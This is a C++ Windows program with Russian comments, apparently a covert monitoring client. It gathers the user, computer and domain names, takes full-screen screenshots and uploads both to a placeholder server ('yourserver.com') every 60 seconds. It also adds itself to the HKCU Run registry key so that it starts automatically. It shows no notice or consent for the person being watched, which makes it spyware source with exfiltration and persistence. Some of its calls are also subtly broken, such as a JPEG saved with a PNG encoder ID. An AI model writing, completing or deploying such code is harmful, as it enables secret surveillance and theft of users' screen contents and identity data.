#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <gdiplus.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

// Получение имени пользователя
std::string getUserName() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    return std::string(username);
}

// Получение имени компьютера
std::string getComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerName(computerName, &computerName_len);
    return std::string(computerName);
}

// Получение доменного имени
std::string getDomainName() {
    char domainName[DNLEN + 1];
    DWORD domainName_len = DNLEN + 1;
    GetComputerNameEx(ComputerNameDnsDomain, domainName, &domainName_len);
    return std::string(domainName);
}

// Отправка данных активности на сервер
void sendActivityData(const std::string& serverUrl) {
    HINTERNET hSession = InternetOpen("ActivityMonitor", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) {
        std::cerr << "InternetOpen failed\n";
        return;
    }

    HINTERNET hConnect = InternetConnect(hSession, serverUrl.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "InternetConnect failed\n";
        InternetCloseHandle(hSession);
        return;
    }

    const char* acceptTypes[] = { "application/json", NULL };
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/api/activity", NULL, NULL, acceptTypes, 0, 0);
    if (!hRequest) {
        std::cerr << "HttpOpenRequest failed\n";
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }

    std::ostringstream oss;
    oss << "{"
        << "\"username\":\"" << getUserName() << "\","
        << "\"computername\":\"" << getComputerName() << "\","
        << "\"domainname\":\"" << getDomainName() << "\""
        << "}";

    std::string postData = oss.str();
    std::string headers = "Content-Type: application/json";

    BOOL result = HttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)postData.c_str(), postData.length());
    if (!result) {
        std::cerr << "HttpSendRequest failed\n";
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}

// Захват скриншота экрана
bool captureScreenshot(const std::string& fileName) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    int width = GetDeviceCaps(hScreenDC, HORZRES);
    int height = GetDeviceCaps(hScreenDC, VERTRES);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);

    Bitmap bitmap(hBitmap, NULL);
    CLSID clsid;
    CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &clsid);
    Status status = bitmap.Save(std::wstring(fileName.begin(), fileName.end()).c_str(), &clsid, NULL);

    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    GdiplusShutdown(gdiplusToken);

    return status == Ok;
}

// Отправка скриншота на сервер
void sendScreenshot(const std::string& serverUrl) {
    std::string fileName = "screenshot.jpg";
    if (captureScreenshot(fileName)) {
        HINTERNET hSession = InternetOpen("ScreenshotUploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hSession) {
            std::cerr << "InternetOpen failed\n";
            return;
        }

        HINTERNET hConnect = InternetConnect(hSession, serverUrl.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            std::cerr << "InternetConnect failed\n";
            InternetCloseHandle(hSession);
            return;
        }

        const char* acceptTypes[] = { "multipart/form-data", NULL };
        HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/api/screenshot", NULL, NULL, acceptTypes, INTERNET_FLAG_RELOAD, 0);
        if (!hRequest) {
            std::cerr << "HttpOpenRequest failed\n";
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            return;
        }

        std::ifstream file(fileName, std::ios::binary);
        std::stringstream buffer;
        buffer << file.rdbuf();
        std::string fileContents = buffer.str();

        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary;

        std::string postData = "--" + boundary + "\r\n";
        postData += "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n";
        postData += "Content-Type: image/jpeg\r\n\r\n";
        postData += fileContents + "\r\n";
        postData += "--" + boundary + "--\r\n";

        BOOL result = HttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)postData.c_str(), postData.length());
        if (!result) {
            std::cerr << "HttpSendRequest failed\n";
        }

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
    } else {
        std::cerr << "Failed to capture screenshot\n";
    }
}

// Добавление клиента в автозапуск
void addToStartup() {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    if (result == ERROR_SUCCESS) {
        std::string exePath = "C:\\Path\\To\\YourApp.exe";
        RegSetValueEx(hKey, "YourAppName", 0, REG_SZ, (BYTE*)exePath.c_str(), exePath.size() + 1);
        RegCloseKey(hKey);
    } else {
        std::cerr << "Failed to open registry key\n";
    }
}

int main() {
    addToStartup();
    while (true) {
        sendActivityData("http://yourserver.com");
        sendScreenshot("http://yourserver.com");
        Sleep(60000); // Отправлять данные каждые 60 секунд
    }
    return 0;
}
